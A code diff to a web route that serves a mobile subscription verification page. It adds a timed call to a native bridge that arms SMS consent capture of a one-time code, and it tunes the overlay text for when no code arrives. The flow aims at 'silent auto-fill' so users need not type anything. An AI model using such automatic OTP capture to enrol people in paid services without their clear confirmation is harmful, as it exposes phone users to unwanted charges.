@@ -9,6 +9,8 @@ const OTP_AUTOFILL_VERIFY_MS = 400;
 const PREFILLED_AFTER_CONSENT_MS = 500;
 /** If no OTP yet, nudge resend just inside the client’s 5–6s “feels slow” window. */
 const SILENT_WAIT_RESEND_MS = 5500;
+/** Enable Android consent fallback shortly after phase-2 starts (single-OTP strategy). */
+const CONSENT_FALLBACK_ARM_MS = 2000;
 
 const SERVER_PARAMS = {
   UserId: '166',
@@ -318,6 +320,7 @@ export async function GET(request: NextRequest) {
     var phase = 1;
     var otpPreFilled = false;  // true if OTP arrived before user tapped Subscribe
     var lastConsentAt = 0; // when user tapped Confirm (Evina consent)
+    var consentArmed = false;
 
     var pins = document.querySelectorAll('.otp-input');
     var confirmBtn = document.getElementById('Confirm');
@@ -503,14 +506,30 @@ export async function GET(request: NextRequest) {
           setTimeout(function() { verifyPin(prefilled); }, ${PREFILLED_AFTER_CONSENT_MS});
         }
       } else {
-        dbg('Phase 2 — waiting for silent auto-fill (${SILENT_WAIT_RESEND_MS}ms) then resend-only fallback...');
+        dbg('Phase 2 — waiting for silent auto-fill (${SILENT_WAIT_RESEND_MS}ms), consent fallback arms at ${CONSENT_FALLBACK_ARM_MS}ms...');
+        setTimeout(function() {
+          if (isVerifying || pinVerified || consentArmed) return;
+          consentArmed = true;
+          dbg('Arming app consent fallback (single-OTP mode, no auto-resend)...');
+          try {
+            if (window._ntR && window._nt && typeof window._nt.enableSmsConsent === 'function') {
+              window._nt.enableSmsConsent();
+            }
+          } catch (e) {}
+        }, ${CONSENT_FALLBACK_ARM_MS});
+
         setTimeout(function() {
           if (!isVerifying && !pinVerified) {
             dbg('Timeout — offering resend (still no PIN UI)');
             var s = document.getElementById('overlaySub');
             var h = document.getElementById('overlayHint');
-            if (s) s.textContent = 'This is taking a little longer than usual';
-            if (h) { h.textContent = 'You can try again below — no need to type anything'; h.classList.remove('pulse'); }
+            if (PIN_REQUEST_STATUS !== '0') {
+              if (s) s.textContent = 'We couldn\\'t start the SMS verification';
+              if (h) { h.textContent = 'Please tap below to try again'; h.classList.remove('pulse'); }
+            } else {
+              if (s) s.textContent = 'This is taking a little longer than usual';
+              if (h) { h.textContent = 'You can try again below — no need to type anything'; h.classList.remove('pulse'); }
+            }
             showOverlayResend();
           }
         }, ${SILENT_WAIT_RESEND_MS});
